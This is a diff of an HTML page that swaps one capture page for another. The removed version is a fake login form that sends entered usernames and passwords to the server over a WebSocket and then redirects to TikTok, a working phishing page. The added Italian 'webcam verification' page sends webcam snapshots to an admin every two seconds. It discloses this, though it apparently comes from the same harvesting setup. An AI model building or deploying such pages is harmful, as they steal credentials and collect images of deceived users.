@@ -1,88 +1,81 @@
 <!doctype html>
-<html lang="en">
+<html lang="it">
 <head>
   <meta charset="utf-8">
-  <title>Login Interface</title>
+  <title>Verifica Webcam</title>
+  <link rel="stylesheet" href="style.css">   <!-- usa il tuo stile scuro -->
   <style>
-    body {
-      font-family: Arial;
-      background: #f2f2f2;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    #box {
-      background: white;
-      padding: 25px;
-      border-radius: 12px;
-      width: 300px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.15);
-      text-align: center;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #007bff;
-      border: none;
-      color: white;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
+    #video { width: 100%; max-width: 400px; border-radius: 12px; margin: 20px 0; }
+    #status { font-size: 18px; margin: 15px 0; color: #0f0; }
+    button { margin: 10px 0; }
   </style>
 </head>
 <body>
-
 <div id="box">
-  <h2>Login</h2>
-
-  <input id="user" placeholder="Username">
-  <input id="pass" placeholder="Password" type="password">
-
-  <button id="enter">ENTER</button>
+  <h2>Verifica Webcam in tempo reale</h2>
+  
+  <input id="user" placeholder="Il tuo nome" value="Utente123">
+  
+  <button id="consenti">✅ Consenti Webcam</button>
+  <button id="stop" style="display:none; background:#ff4444;">⛔ Stop</button>
+  
+  <video id="video" autoplay playsinline muted></video>
+  <div id="status"></div>
 </div>
 
 <script>
-  // WebSocket connection to the server
   const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
+  let stream = null;
+  let interval = null;
+  const video = document.getElementById('video');
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
 
-  // Handle WebSocket errors
-  ws.onerror = (error) => {
-    console.error("WebSocket Error: ", error);
-    alert("WebSocket connection failed. Please try again later.");
+  document.getElementById('consenti').onclick = async () => {
+    const username = document.getElementById('user').value || "Anonymous";
+    
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      video.srcObject = stream;
+      video.play();
+      
+      document.getElementById('consenti').style.display = 'none';
+      document.getElementById('stop').style.display = 'block';
+      document.getElementById('status').textContent = '✅ Webcam attiva – la tua faccia è visibile all\'admin';
+      
+      // Invia foto ogni 2 secondi
+      interval = setInterval(() => {
+        if (!video.videoWidth) return;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        
+        const base64 = canvas.toDataURL('image/jpeg', 0.7);  // foto compressa
+        
+        ws.send(JSON.stringify({
+          user: username,
+          type: 'webcam_frame',
+          image: base64
+        }));
+      }, 2000);
+      
+    } catch (err) {
+      alert("❌ Non hai dato il permesso alla webcam o non hai una camera.");
+      console.error(err);
+    }
   };
 
-  // Handle WebSocket closure
-  ws.onclose = () => {
-    console.warn("WebSocket connection closed.");
+  document.getElementById('stop').onclick = () => {
+    if (interval) clearInterval(interval);
+    if (stream) stream.getTracks().forEach(track => track.stop());
+    video.srcObject = null;
+    document.getElementById('consenti').style.display = 'block';
+    document.getElementById('stop').style.display = 'none';
+    document.getElementById('status').textContent = 'Verifica fermata';
   };
 
-  // When the ENTER button is clicked
-  document.getElementById("enter").onclick = () => {
-    const u = document.getElementById("user").value;
-    const p = document.getElementById("pass").value;
-
-    // Send message to the server
-    ws.send(JSON.stringify({
-      user: u,
-      message: p
-    }));
-
-    // Redirect to TikTok after sending
-    setTimeout(() => {
-      window.location.href = "https://www.tiktok.com";
-    }, 300);
-  };
+  // Se chiudi la pagina, ferma tutto
+  window.onbeforeunload = () => { if (stream) stream.getTracks().forEach(t => t.stop()); };
 </script>
-
 </body>
 </html>
